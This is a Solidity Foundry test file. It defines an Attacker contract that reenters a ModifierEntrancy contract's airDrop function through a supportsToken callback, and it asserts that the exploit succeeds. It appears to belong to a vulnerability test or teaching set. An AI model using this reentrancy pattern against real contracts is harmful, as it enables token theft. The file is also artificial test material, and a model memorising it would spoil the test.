
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ModifierEntrancy} from "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    ModifierEntrancy public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes() public {
        _attacker.call(address(_contractUnderTest));
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ModifierEntrancy public victim;
    bool hasBeenCalled;
    bool public exploitSucceeded;

    constructor(address victimAddress) {
        victim = ModifierEntrancy(victimAddress);
    }

    function call(address token) public {
        victim.airDrop();
        if (victim.tokenBalance(address(this)) == 40) {
            exploitSucceeded = true;
        }
    }

    function supportsToken() external returns(bytes32) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            victim.airDrop();
        }
        return keccak256(abi.encodePacked("Nu Token"));
    }
}
